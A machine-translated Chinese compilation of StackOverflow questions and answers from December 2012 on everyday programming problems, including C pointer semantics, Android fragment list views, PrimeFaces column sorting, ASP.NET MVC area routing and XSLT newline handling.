# StackOverflow 问答 13703000-13703999

# jquery - 浏览器加载指示器背后的逻辑

> ID：13703000
> 
> 赞同：1
> 
> 时间：2012-12-04T12:33:13.220
> 
> 标签：jquery, web-applications, browser

我有一个网络应用程序，当页面加载时，我会在其中进行一堆 ajax 调用。我期待浏览器会在页面加载完毕并下载 JS、CSS 文件后立即删除加载指示器。但它会一直显示加载指示器，直到所有 ajax 调用都返回。

但是，如果我在进行 ajax 调用之前等待“某个时间”，浏览器确实会删除加载指示器。我必须等待的时间不是固定的。在 localhost 上 200 毫秒就足够了，但在清除了浏览器缓存的服务器上，需要大约 2 秒。是下载所有 js 和 css 文件所需的时间吗？

有谁知道这背后的逻辑。我应该什么时候在页面加载时进行 ajax 调用，以便浏览器的加载指示器不会等到所有 ajax 调用都返回？

# iphone - 在 Html 中嵌入图像并在 UIWebView 中加载

> ID：13703002
> 
> 赞同：0
> 
> 时间：2012-12-04T12:33:15.887
> 
> 标签：iphone, html, ios, cocoa-touch, uiwebview

我知道如何在 WebView 中加载图像，现在我正在尝试在 html 中嵌入图像并在 UIWebView 中加载。以下是我正在使用的代码，

```
NSArray*    paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
NSString*   documentsDirectoryPath = [paths objectAtIndex:0];
NSString*   folderPath =  [documentsDirectoryPath stringByAppendingPathComponent:@"iOSDevices"];
NSArray*    filesCount = [[NSFileManager defaultManager ] folderPath error:nil];
NSString* path = [NSString stringWithFormat:@"%@/%@",folderPath,[filesCount objectAtIndex:0]];

    NSString *htmlString = [NSString stringWithFormat:@"<html><body><img src=\"%@\" type=\"jpg\" width=\"320\" height=\"480\"></body></html>", path];
    [_webView loadHTMLString:htmlString baseURL:nil]; 
```

我错过了什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T12:41:10.160

图片名称不可用，path 只获取图片路径，不在路径中给出图片，在标签中添加图片名称

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T12:59:16.960

如果您尝试从本地加载图像，只需`file://` 在 src 前面添加这个，比如

```
`NSString *htmlString = [NSString stringWithFormat:@"<html><body><img src=\"file://%@\" type=\"jpg\" width=\"320\" height=\"480\"></body></html>", path];`
```

并检查您是否正在显示图像“jpg”或“png”，并检查您是否`type`在`img`标签中给出正确的

html字符串应该是， `<img src="file:///Users/file/...some other paths../Documents/Images/imag.png" type="png" width="320" height="480">`

# c# - 使用 itextsharp 从 pdf 中获取坐标

> ID：13703006
> 
> 赞同：0
> 
> 时间：2012-12-04T12:33:26.587
> 
> 标签：c#, itextsharp

我做了这样的事情：

```
 PdfReader reader = new PdfReader("cde.pdf");
        TextWithPositionExtractionStategy S = new TextWithPositionExtractionStategy();
        PdfTextExtractor.GetTextFromPage(reader,1,S);

             Vector curBaseline = renderInfo.GetDescentLine().GetStartPoint();
            Vector topRight = renderInfo.GetAscentLine().GetEndPoint();

            iTextSharp.text.Rectangle rect = new iTextSharp.text.Rectangle(curBaseline[Vector.I1], curBaseline[Vector.I2], topRight[Vector.I1], topRight[Vector.I2]);
            string x1 = curBaseline[Vector.I1].ToString();
            string x2 = curBaseline[Vector.I2].ToString();
            string x3 = topRight[Vector.I1].ToString();
            string x4 = topRight[Vector.I2].ToString(); 
```

但是，我得到的是一个字符串的坐标，而不是一个单词。我怎样才能修改代码以便我可以得到单词坐标。谢谢。

# c - 将静态字符数组转换为动态

> ID：13703008
> 
> 赞同：-2
> 
> 时间：2012-12-04T12:33:34.530
> 
> 标签：c, dynamic, arrays

给定一个静态数组，如何使用`arr`as将其更改为动态分配`a pointer unsigned`：

```
char arr[] = {1,4,5,8,9,6,4,3,2,1,5,7};  
unsigned char *arr = NULL; 
```

现在如何将此值分配给`arr`.

我是编程新手，请帮忙。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T12:41:01.627

用于[`malloc()`](http://en.cppreference.com/w/c/memory/malloc)动态分配数组并用于[`memcpy()`](http://en.cppreference.com/w/c/string/byte/memcpy)复制内容。记住[`free()`](http://en.cppreference.com/w/c/memory/free)什么是`malloc()`d.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T12:37:30.680

最 C++ 的方法是使用 a`std::vector`而不是原始分配的数组：

```
std::vector<unsigned char> dynArr(arr, arr + 12); //where 12 is array size 
```

如果您确实需要动态分配的原始数组，请使用`std::copy()`：

```
unsigned char *dynArr = new unsigned char[12];
std::copy(arr, arr + 12, dynArr); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T12:44:33.260

尝试

```
char arr[] = {1,4,5,8,9,6,4,3,2,1,5,7};
char *pArr = arr; 
```

现在您可以访问第一个元素：

```
*pArr 
```

第二个元素为：

```
*(pArr+1) 
```

例如

您也可能想阅读[本教程](http://www.cplusplus.com/doc/tutorial/pointers/)。

# ajax - 树网格ajax在extjs中不刷新

> ID：13703010
> 
> 赞同：0
> 
> 时间：2012-12-04T12:33:49.100
> 
> 标签：ajax, extjs

我一直在做一个项目，我使用 extjs 来显示一些服务计划。我能够在一开始就填充它。然后我想要一个按钮 onclick 将在网格中填充哪些新数据。我能够成功调用树服务中的函数，但未显示数据。我的treegrid按钮代码是：

```
{
                xtype: 'button',
                text: 'Search',
                listeners: {
                    click: function () {
                      //  Ext.getCmp('tree').getView().refresh();
                        Ext.Ajax.request({
                            method: 'GET',
                            extend: 'Ext.data.Model',
                            fields: ['planid', 'id', 'text', 'startdate', 'enddate', 'iconCls', 'expanded', 'leaf'],
                            params: {
                                serviceplanid: serviceplanid,
                                userid: userid,
                                // startdate: startdate,
                                // stopdate: stopdate,
                                initialstate: initialstate,
                                fonttype: fonttype,
                                fonttypeex: fonttypeex
                            },
                            url : '/BloomMatrix2/TreeService2.svc/getfulldata',
        reader: new Ext.ux.aspNetJsonReader({ root: 'children'
        }),

        success: function (response) {
                                //console.log(response);
                                //swapStrore();
                            }
                        });
                    }                       
                }
            }, 
```

我的服务读取功能：

```
[WebGet()]
[OperationContract]
[ScriptMethod(ResponseFormat = ResponseFormat.Json)] 
public string getdata(String serviceplanid,String userid, String initialstate,String fonttype, String fonttypeex)
 {

    System.Diagnostics.Debug.WriteLine("IN GETDATA"+initialstate);
    SqlConnection Conn = new SqlConnection(CommonFunctions.GetConnectionString("YourConnection"));
    Conn.Open();

    SqlCommand cmd = new SqlCommand("[dbo].[VMResults_GetCategoriesTree]", Conn);
    cmd.Parameters.Add("@UserId", SqlDbType.BigInt).Value = 1;
    cmd.Parameters.Add("@ServicePlanCurrent", SqlDbType.Char).Value = "N";

    cmd.CommandType = CommandType.StoredProcedure;
    SqlDataAdapter adapter = new SqlDataAdapter(cmd);
    DataSet ds1 = new DataSet();
    adapter.Fill(ds1);
    String ret=makeJSON(ds1,initialstate,fonttype,fonttypeex);
    return ret;
}

[WebGet()]
[OperationContract]
[ScriptMethod(ResponseFormat = ResponseFormat.Json)]
public string getfulldata(String serviceplanid, String userid, String initialstate, String fonttype, String fonttypeex)
{

    System.Diagnostics.Debug.WriteLine("IN GETDATA" + initialstate);
    SqlConnection Conn = new SqlConnection(CommonFunctions.GetConnectionString("YourConnection"));
    Conn.Open();

    SqlCommand cmd = new SqlCommand("[dbo].[VMResults_GetCategoriesTree]", Conn);
    cmd.Parameters.Add("@UserId", SqlDbType.BigInt).Value = 1;
    cmd.Parameters.Add("@ServicePlanCurrent", SqlDbType.Char).Value = "Y";

    cmd.CommandType = CommandType.StoredProcedure;
    SqlDataAdapter adapter = new SqlDataAdapter(cmd);
    DataSet ds = new DataSet();
    adapter.Fill(ds);
    String ret = makeJSON(ds, initialstate, fonttype, fonttypeex);
    return ret;
} 
```

我必须在单击按钮时调用后一个按钮..提前谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T21:45:22.050

您需要在树上使用与服务器对话的代理来定义商店。请参阅 Sencha 示例。

或者，如果您想像在代码中那样运行自己的 AJAX 请求，那么您需要从成功块中的手动解析数据中创建[NodeInterface](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.NodeInterface)对象并将它们一一添加到树面板中 - 不会很漂亮。

# asp.net-mvc - Html.RenderAction MVC 区域路由问题

> ID：13703015
> 
> 赞同：4
> 
> 时间：2012-12-04T12:34:08.530
> 
> 标签：asp.net-mvc, razor

我试图在我的 ASP.net MVC 4 项目的主 Shared **_Layout.chtml文件中呈现部分视图。**这个简单的代码如下所示

```
@{Html.RenderAction("UserMenu", "MyController");} 
```

当用户位于站点的根目录中时，这一切都可以正常工作。但是，我的项目还包括一个名为“客户”的“区域”。

当用户导航到我网站的“客户”区域内的任何地方时，上面的行会发生异常，调试器基本上告诉我它找不到控制器

```
"The controller for path '/Customers/CustomersHome' was not found or does not implement IController." 
```

如果我使用**Html.RenderPartial也会发生同样的异常**

有趣的是，如果我将**Html.RenderAction 换成**Html.Action **，**则不会发生此异常（尽管显然没有呈现任何内容）。

有谁知道解决这个问题的方法？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-04T12:44:54.717

您是否尝试将区域设置为空字符串？

```
@{Html.RenderAction("UserMenu", "MyController", new { area="" });} 
```

# c# - 将请求参数绑定到特定的方法参数

> ID：13703019
> 
> 赞同：2
> 
> 时间：2012-12-04T12:34:26.590
> 
> 标签：c#, asp.net-mvc-2, parameterbinding

在 ASP.NET MVC 2（是的，两个，我为此使用 MONO）中，我想知道是否可以将多个请求参数绑定到一个操作方法参数中。

让我举个例子。

我正在传递 2 个参数（使用我喜欢的任何方法，GET、POST 等）：

*   姓名
*   指导

有没有办法将这些参数绑定到这个：

```
public JsonResult MyMethod(NameClass identifier) 
```

而不是这个：

```
public JsonResult MyMethod(string name, string guid) 
```

用这个？

```
public class NameClass
{
    public string Guid { get; set; }
    public string Name { get; set; }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T12:36:50.000

绝对地。您只需使用点符号来命名您的字段，就好像您要从方法内部访问该属性一样。这意味着 Guid 字段被命名`identifier.Guid`并且 Name 字段`identifier.Name`。但是，您不能利用强类型的用户控件，这太糟糕了；）。

# iphone - 自动发送消息和邮件？

> ID：13703020
> 
> 赞同：0
> 
> 时间：2012-12-04T12:34:27.650
> 
> 标签：iphone, ios, xcode, sms

好的，我知道有很多可能重复的问题，但没有一个回答我的问题。

根据Apple的￼<a href="http://stadium.weblogsinc.com/engadget/files/app-store-guidelines.pdf" rel="nofollow">￼App Store Review Guidelines（如果是官方的）我只能找到 4 条规则说明有关消息传递的任何内容

5.5 使用推送通知发送未经请求的消息，或用于网络钓鱼或垃圾邮件的应用程序将被拒绝

6.5 使用 Game Center 服务发送未经请求的消息，或用于网络钓鱼或垃圾邮件的应用程序将被拒绝

21.2 募捐必须通过 Safari 中的网站或短信进行

22.6 启用匿名或恶作剧电话或短信/彩信的应用程序将被拒绝

根据我的说法，如果我们有用户担心发送短信，这些规则并不完全限制自动发送消息。

现在我想知道是否有办法在应用程序暂停时在预定时间自动发送短信，就像我们可以触发 UILocalNotification 一样？如果是，那么如何，如果不是，那么为什么？

我也不想使用任何第三方 API 或一些服务器端编程。我想从手机发送一条简单的短信。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T12:37:18.883

不，您不能在没有用户发送消息的情况下通过 Apple 提供的 SDK 发送电子邮件或 SMS。

您可以设置自己的 SMS 服务器邮件服务器来提供解决方案，但您无法使用 Apple 提供的 SDK 来完成。

以这种方式实施的原因是为了保护用户，因为您可以向某种服务器号码发送 100 条短信，从而使用户不知道成本。或者，您的应用程序可能会在未经用户同意的情况下通过发送电子邮件来向用户发送垃圾邮件。

# java - Java TCP套接字，在线程中发送和接收对象

> ID：13703021
> 
> 赞同：1
> 
> 时间：2012-12-04T12:34:29.007
> 
> 标签：java, multithreading, sockets, tcp, multiplayer

我是一个初学者程序员，目前被困在一个java项目上。我有一个功能齐全的单人扫雷游戏，面向对象，我正在尝试实现 TCP 多人功能。游戏有一个控制类，它处理视图、游戏字段、计时器、标签、具有动作侦听器等。对于多人游戏，我正在尝试创建一个单独的线程，它具有 Socker 和 ServerSocket，并取决于构造函数传递的参数，充当主机或客户端。运行时，它应该尝试从输入流中读取我的自定义 Packet 类，并且另一种方法可以发送数据包。这是代码：

公共类多线程扩展线程{

```
GameControl gc;
ServerSocket servSocket;
Socket socket;
Packet data;
ObjectInputStream incoming;
ObjectOutputStream outgoing;
Boolean isHost;
Boolean commEnd;

public MultiThread(GameControl gc, Boolean isHost) {
    this.gc = gc;
    this.isHost = isHost;
    this.commEnd = false;
    gc.chatDialog.setVisible(true);
}

public void run() {
    try {
        if (isHost) {
            servSocket = new ServerSocket(1234);
            gc.chatDialog.status.setText("Awaiting connection...");
            socket = servSocket.accept();
            gc.chatDialog.status.setText("Connected.");
            incoming = new ObjectInputStream(socket.getInputStream());
            outgoing = new ObjectOutputStream(socket.getOutputStream());
        }
        else if (!isHost){
            socket = new Socket("localhost", 1234);
            if (socket.isConnected()) {
                gc.chatDialog.status.setText("Connected.");
                incoming = new ObjectInputStream(socket.getInputStream());
                outgoing = new ObjectOutputStream(socket.getOutputStream());
            }
            else {
                gc.chatDialog.status.setText("No connection.");
            }
        }

        while (!commEnd) {
            try {
                Thread.sleep(100);
                data = (Packet)incoming.readObject();
                System.out.println(data.msg);
                gc.chatDialog.chatArea.append(data.getMsg());   
            }
            catch (IOException e) {e.printStackTrace();}
        }

        System.out.println("asd");
        gc.chatDialog.status.setText("No connection");
        incoming.close();
        outgoing.close();
        socket.close();
        servSocket.close();
    }

        catch (Exception e) {e.printStackTrace();}
}

public void sendPacket(Packet p) {
    try {
        outgoing.writeObject(p);
    }
    catch (IOException e) {e.printStackTrace();}
} 
```

}

连接在 localhost 上建立，但在尝试初始化传入和传出字段时抛出异常。对不起，如果代码是一团糟，我觉得我有一些严重的误解，所以任何帮助表示赞赏。

# jsf - jsf primefaces 数据表 p:columns

> ID：13703022
> 
> 赞同：4
> 
> 时间：2012-12-04T12:34:30.577
> 
> 标签：jsf, datatable, primefaces

我有一个像这样的 Primefaces 数据表

```
<p:dataTable
   value="#{valueList.value}"
   var="value"
   selection="#{valueList.selected}"
   id="measurementTable"
   paginator="true"
   rows="20"
   rowsPerPageTemplate="20,25,30,35,40"/> 
```

和动态列

```
<p:columns
  value="#{valueList.columns}"
  var="column"
  columnIndexVar="colIndex"
 /> 
```

这工作正常，我的数据表看起来不错，但是当我添加

```
 sortBy="#{value.charge}" 
```

到`p:columns`，我点击列进行排序，css样式被破坏，我得到了一个包含我的数据而不是数据表的列表，这非常难看。

* * *

我的代码

```
<p:dataTable
        value="#{measurementList.measurements}"
        var="measurement"
        selection="#{measurementList.selected}"
        id="measurementTable"
        paginator="true"
        rows="20"
        rowsPerPageTemplate="20,25,30,35,40"
        rowKey="#{measurement.mdkFid}"
        emptyMessage="#{measurementList.getCapString('no_records_found')}">

        <p:column selectionMode="multiple" style="width:18px" />

        <p:column>
            <p:commandLink title="#{measurementList.getString('edit')}" update=":contentPanel">
                <h:outputText styleClass="ui-icon ui-icon-pencil" />
                <f:actionListener binding="#{measurementList.editSelected(measurement) }" />
                <f:actionListener binding="#{navigation.goTo('/xhtml/measurements/editMeasurement.xhtml') }" />
            </p:commandLink>
        </p:column>

        <p:columns
            value="#{measurementList.columns}"
            var="column"
            columnIndexVar="colIndex"
            styleClass="measurementListDatatableColumn"
            sortBy="#{column.displayName}" 
            >
            <f:facet name="header">#{column.displayName}</f:facet>
                <p:column>
                    #{measurement[column.methodName]}
                </p:column>
        </p:columns> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T12:37:52.220

你的排序应该看起来像

```
sortBy="#{value[column.charge]}" 
```

看一下展示示例[DataTable - Dynamic Columns](http://www.primefaces.org/showcase/ui/datatableDynamicColumns.jsf)

改变

```
 <p:columns
        value="#{measurementList.columns}"
        var="column"
        columnIndexVar="colIndex"
        styleClass="measurementListDatatableColumn"
        sortBy="#{column.displayName}" 
        >
        <f:facet name="header">#{column.displayName}</f:facet>
            <p:column>
                #{measurement[column.methodName]}
            </p:column>
    </p:columns> 
```

进入

```
 <p:columns
        value="#{measurementList.columns}"
        var="column"
        columnIndexVar="colIndex"
        styleClass="measurementListDatatableColumn"
        sortBy="#{measurement[column.methodName]}" 
        >
        <f:facet name="header">
            #{column.displayName}
        </f:facet>

         #{measurement[column.methodName]}

    </p:columns> 
```

* * *

一般来说：用于显示列数据的相同 EL 表达式应该用于`sortBy`

# android - 将数据添加到片段上的列表视图

> ID：13703028
> 
> 赞同：3
> 
> 时间：2012-12-04T12:34:58.107
> 
> 标签：android, android-listview, android-fragmentactivity

我有一个关于活动的片段，上面有一个 listview 元素。无法将数据添加到列表视图。有人可以告诉我有什么问题吗？

```
public class MainActivity extends FragmentActivity {

    public String[] listS ={"item1","item2","item3"};

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main); 
        FragmentManager fm = getSupportFragmentManager();
        FragmentTransaction ft = fm.beginTransaction();
        MainFragment f = new MainFragment();
        ft.replace(R.id.fragcontainer, f);
        ft.commit();    
        //here the problem occurs
        ListView lv = (ListView)findViewById(R.id.listf);
        lv.setAdapter(new ArrayAdapter<String>(this, R.layout.list_row,R.id.labeld, listS));
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
} 
```

片段的类：

```
public class MainFragment extends Fragment {
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle sis){
        return inflater.inflate(R.layout.fragment_layout, container, false);
    }

} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-04T12:43:41.200

这个方法有很多问题，但它的根源是`FragmentTransaction` `replace()`添加片段的方法，我假设，包含`ListView`你试图找到的片段是一个异步过程。*片段不会立即*添加到 Activity 的视图层次结构中，而是稍后添加。

如果你想在 a`ListView`中添加东西`Fragment`，为什么不从`MainFragment`子类的`onCreateView()`方法中做呢？这就是它的工作方式。

编辑：一个典型的`onCreateView()`：

```
@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container,
        Bundle savedInstanceState) {
    View view = inflater.inflate(R.layout.fragment_layout, container, false);
    ListView lv = (ListView) view.findViewById(R.id.listf);
    lv.setAdapter(new ArrayAdapter<String>(this, R.layout.list_row,R.id.labeld, listS));             
    return view;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:07:17.740

当你添加代码来定义你的类时，

```
public class MainFragment extends Fragment {
        public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle sis) {
            View view = inflater.inflate(R.layout.my_fragment, container, false);
            ListView listView = (ListView) view.findViewById(R.id.list);
            return view;
        }
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:14:02.230

问题是您正在询问该 ListView 的活动

“这个。”findViewById(...

您可以向 Fragment 请求视图，或在 Fragment 类中管理 listView 的内容。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-11-19T01:45:12.277

请使用以下设计窗口中的列表视图。我遇到了确切的问题，现在我可以在源代码中找到视图。

主要问题是IDE在ID前面附加了“android”

```
<ListView
    android:id="@+id/list"
    android:layout_width="match_parent"
    android:layout_height="wrap_content" >
</ListView> 
```

# c - 双指针与单指针

> ID：13703029
> 
> 赞同：5
> 
> 时间：2012-12-04T12:34:58.777
> 
> 标签：c, pointers

有人可以向我解释/解释为什么下面代码片段中主函数中变量 i 的值不会通过函数 test1 更改而通过 test2 更改吗？我认为单个指针应该足以改变 i 的值。为什么我们应该使用双指针？

```
#include <stdio.h>

void test1(int* pp)
{
   int myVar = 9999;
   pp = &myVar;
}

void test2(int** pp)
{
   int myVar = 9999;
   *pp = &myVar;
}

int main()
{
   printf("Hej\n");
   int i=1234;
   int* p1;

   p1 = &i;

   test1(p1);
   printf("does not change..., p1=%d\n",*p1);

   test2(&p1);
   printf("changes..., p1=%d\n",*p1);
   return 0;
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-04T12:36:47.780

在 C 中，参数是按值传递的。这意味着`test1`当您传递`pp`一个副本时，是由指针组成的，当您更改它时，更改是**针对副本**而不是指针本身。`test2`副本是双指针，但是当您取消引用并在此处分配时

```
*pp = &myVar; 
```

您正在更改所指向的内容，而不是更改`pp`自身。请注意，此行为`test2`未定义，如此处的其他一些答案中所述

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-04T12:38:26.887

但是您并没有更改 的值，而是更改了指向`i`的地址`pp`，如果您只想更改 的值，`i`那么将测试更改为：

```
void test3(int* pp)
{
   int myVar = 9999;
   *pp = myVar;
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-04T12:37:17.290

如果要更改类型变量的值，`T`则必须使用该类型 ( `T*`) 上的指针。由于您要更改指针 ( `T = int*`)，因此您必须提供指向指针 ( `T* = int**`) 的指针，否则您只会更改副本。

注意

```
int myVar = 9999;
*pp = &myVar; 
```

将导致未定义的行为，因为`pp`现在将包含退出函数后无效的局部变量的地址。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-04T12:37:38.053

因为`f(x)`不能改变 的值`x`，无论 x 是 int、float 还是指针。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-12-04T12:38:58.637

```
void test1(int* pp)
{
   int myVar = 9999;
   pp = &myVar;
} 
```

这个函数被传递了一个指针`pp`。该函数修改该指针。但是由于参数是按值传递的，调用者看不到该修改。

您需要编写如下函数：

```
void test1(int* pp)
{
   *pp = 9999;
} 
```

这个函数的调用者应该传递一个`int`变量的地址。然后该函数将一个`int`值（在本例中为 9999）写入该地址。这是关键。你被传递了一个地址，然后你将一个值写入该地址。您损坏的版本只是修改了地址。你错过了间接性。

当函数返回时，调用者可以观察到`int`地址被传递给函数的变量的修改。调用代码可能如下所示：

```
int i = 0;
test1(&i); // pass address of int variable
printf("%d\n", i); // prints the new value, 9999 
```

* * *

```
void test2(int** pp)
{
   int myVar = 9999;
   *pp = &myVar;
} 
```

现在，这被严重破坏了。这个函数确实返回了一个指向调用者的指针。但是它会返回一个指向对象的指针，该对象在函数返回后立即超出范围。这就是所谓的*未定义行为*。不要这样做。永远不要从函数中传递一个指向该函数中定义的局部变量的指针。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-12-04T12:37:43.330

```
int* p1;

   p1 = &i;

   test1(p1);  //1st

   test2(&p1);  //2nd 
```

简单来说，第一个是`pass by value`，第二个是`pass by address`。

描述 ：

在第一种情况下，它传递的指针实际上是内部的副本，`p`因此`test1`内部`pp`test1 是该函数的本地，它是在`test1`. 您分配了地址，当它失去功能时，它被破坏了。

但在第二种情况下，您将指针的地址传递给`test2`函数。因此`pp`in 中的指针`test2`将指向 main 中的指针，因此为using`p`分配一个新地址将自动设置 of 的值（因为您正在取消引用指针）。因此，当终止时仍将指向修改后的位置。`pp``*pp = &myVar``p``test2``p`

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-12-04T12:38:16.143

`pp = &myVar;`将 的地址分配给`myVar`指针`pp`。如果要更改`pp`指向的值，请使用

```
*pp = myVar; 
```

反而。

在回答您的第二个问题时，当您想要更改指向的对象而不是更改现有对象的值时，请将指针传递给指针。

# java - 从另一个控制一个java程序

> ID：13703033
> 
> 赞同：3
> 
> 时间：2012-12-04T12:35:05.450
> 
> 标签：java

我想从另一个使用运行 Java 程序`ProcessBuilder`

我使用了代码

```
Process pr = rt.exec("cmd /c cd C:\\Users\\naman\\Desktop & java CalculateSum");
BufferedReader input = new BufferedReader(new InputStreamReader(pr.getInputStream()));
BufferedReader error = new BufferedReader(new InputStreamReader(pr.getErrorStream()));
BufferedWriter output= new BufferedWriter(new OutputStreamWriter(pr.getOutputStream()));
String line = null;

while ((line = input.readLine()) != null) {
    System.out.println(line);
}

output.write("10");
output.write("30");

while ((line = input.readLine()) != null) {
    System.out.println(line);
}

int exitVal = pr.waitFor();
System.out.println("Exited with error code " + exitVal); 
```

CalculateSum 有以下代码：

```
System.out.print("Enter 1 st value : ");
a=Integer.parseInt(br.readLine());
System.out.print("\nEnter second number : ");
b=Integer.parseInt(br.readLine());
System.out.println("\nresult is : "+(a+b)); 
```

我的基本动机是从另一个 Java 程序运行一个 Java 程序。

**注意**：我不想使用命令行参数来获取输入。我也尝试过使用`ProcessBuilder`相同的目的，但这也没有用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T12:47:16.230

You could use ExpectJ (http://expectj.sourceforge.net/) to talk to another program using standard input/output.

Use this instead of trixing with `BufferedReader`/`BufferedWriter` in your first code block:

```
ExpectJ expectinator = new ExpectJ(5);
Spawn shell = expectinator.spawn("cmd /c cd C:\\Users\\naman\\Desktop & java CalculateSum");

// Talk to it
shell.expect("Enter 1 st value");
shell.send("10\n");
shell.expect("Enter second value");
shell.send("30\n"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T12:40:55.340

只是一味地猜测问题是什么，问题可能是潮红。

尝试`System.out.flush();`在CalculateSum 中每次打印后添加。

在第一个程序中，将换行符添加到您的 output.write 调用中，例如`output.write("10\n");`, 以及`output.flush();`之后。

# xml - XSLT 使用空行

> ID：13703035
> 
> 赞同：0
> 
> 时间：2012-12-04T12:35:14.027
> 
> 标签：xml, windows, xslt, ms-word, word-2003

我有以下 XML：

```
<node><mtype>code</mtype><mtext>&lt;script&gt;
 // a Javascript example
 alert("Hello World");
 &lt;/script&gt;</mtext></node> 
```

HTML 中的相同文本将编写如下：

```
<pre><code>&lt;script&gt;
 // a Javascript example
 alert("Hello World");
 &lt;/script&gt;</code></pre> 
```

我们可以看到实际的文本是 HTML 编码的，这很好。我接下来要做的是使用以下 XSLT 将上述 mtext 表示为`<code>`Word XML 中的元素（具有特定样式）。

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" 
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:w="http://schemas.microsoft.com/office/word/2003/wordml"
  >

  <xsl:template match="/">
    <xsl:for-each select="/node">
    <xsl:if test="mtype = 'code'">
      <w:p>
        <w:pPr><w:jc w:val="left" /></w:pPr>
        <!--<xsl:text select="mtext/node()"/>-->
        <w:r><w:t><xsl:value-of select="mtext/node()" disable-output-escaping="yes"/></w:t></w:r>
      </w:p>
    </xsl:if>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet> 
```

如果我对定义的 XML 运行 XLST，我会得到以下信息：

```
$ xsltproc code.xslt code.xml
<?xml version="1.0"?>
<w:p xmlns:w="http://schemas.microsoft.com/office/word/2003/wordml"><w:pPr><w:jc w:val="left"/></w:pPr><w:r><w:t><script>
 // a Javascript example
 alert("Hello World");
 </script></w:t></w:r></w:p> 
```

这不是我想要达到的。首先是实际的特殊字符，更重要的是被删除的新行。我在`<w:t>`元素中使用的任何内容都只在一行中可见，但我的`<code>`文本有多行，这就是为什么我也需要多行。

我听说我可以使用`<xsl:text>`or `<![CDATA[ ... ]]>`，但我无法生成在 Microsoft Word 中实际创建**多行部分的 XML。** `<code>`

编辑：雅各布，如果我使用它，我没有换行符。结束 XML 如下，不打印换行符：

```
<w:p wsp:rsidR="005963F5" wsp:rsidRDefault="00804A03" wsp:rsidP="00804A03" xml:space="preserve">
<w:pPr><w:jc w:val="left"/><w:pStyle w:val="VirisCode"/></w:pPr>
<w:r><w:t>
     &lt;script&gt;
     // a Javascript example
     alert("Hello World");
     &lt;/script&gt;
 </w:t></w:r>
</w:p> 
```

**评论：**我不知道输出应该是什么样子，因为我不是 XML 专家；如果我知道我可能会自己写。因此，只要 XML 可以工作，它就可以看起来像它喜欢的任何东西。通过作品，我的意思是它`<code>`以我想要的方式显示块。我希望代码块完全按照它们在`<mtext>`XML 节点中的显示方式显示，包括新行和所有内容。在这种情况下，确切的输出（一旦已经用 Word 打开）应该显示如下：

```
<script>
// a Javascript example
alert("Hello World");
</script> 
```

请注意，特殊字符显示正确，并且存在换行符。问题在于`<w:t>`在一行中显示所有内容的元素，这是我不想要的，但不知道还能使用什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:48:43.580

在 xsl:output、模板、元素或 lvl 的值上使用 xml:space 来保留换行符/空格。

# spring-mvc - 如何在同一图表上对现有的 jfree 饼图部分进行分区

> ID：13703041
> 
> 赞同：1
> 
> 时间：2012-12-04T12:35:44.260
> 
> 标签：spring-mvc, jfreechart, pie-chart, jfreereport

我正在使用 Jfreechart 在 Spring MVC 中创建饼图。我的要求是：

`i have to create two section,FOUND and LOST on pie chart.also in,LOST section i need to create more sections representing Count of different LOST items. here`

现在，我可以在图表上创建两个部分，FOUND 和 LOST。但我不知道如何在同一张图表上对 LOST 部分进行分区。我怎样才能做到这一点..请帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T18:45:31.567

您可能从 开始[`org.jfree.chart.demo.PieChartDemo1`](http://www.jfree.org/jfreechart/api/javadoc/org/jfree/chart/demo/PieChartDemo1.html)，因为[源](http://www.jfree.org/jfreechart/api/javadoc/src-html/org/jfree/chart/demo/PieChartDemo1.html)包含在分发中。不幸的是，`DefaultPieDataset`不支持适合分区的子类别。

以下是一种方法的概述：

*   扩展`DefaultPieDataset`以包括对分区建模所需的数据，例如`Set<String> lost`和`Set<String> found`，表示属于每个分区的一组键。

